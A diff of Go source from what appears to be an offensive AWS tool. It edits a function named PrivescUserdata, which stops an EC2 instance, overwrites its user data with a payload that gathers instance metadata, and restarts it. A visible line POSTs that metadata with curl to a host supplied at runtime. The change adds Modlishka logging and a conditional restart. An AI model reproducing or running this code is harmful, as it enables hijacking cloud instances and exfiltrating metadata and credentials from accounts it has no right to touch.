@@ -7,12 +7,12 @@ import (
 	"github.com/aws/aws-sdk-go/aws"
 	"github.com/aws/aws-sdk-go/aws/session"
 	"github.com/aws/aws-sdk-go/service/ec2"
+	"github.com/drk1wi/Modlishka/log"
 )
 
 func PrivescUserdata(sess *session.Session, instanceID string, payload string) {
 
 	StopInstance(sess, instanceID)
-	fmt.Println("Waiting for instance to stop...")
 	time.Sleep(30 * time.Second)
 
 	//userdata payload to extract metadata
@@ -49,6 +49,9 @@ curl -X POST -d "$META" %s
 			Value: []byte(userData),
 		},
 	}
-	ModifyInstanceAttribute(sess, input)
-	StartInstance(sess, instanceID)
+	attrib := ModifyInstanceAttribute(sess, input)
+	if attrib {
+		log.Infof("Modifying Instance Attribute UserData on %v", instanceID)
+		StartInstance(sess, instanceID)
+	}
 }
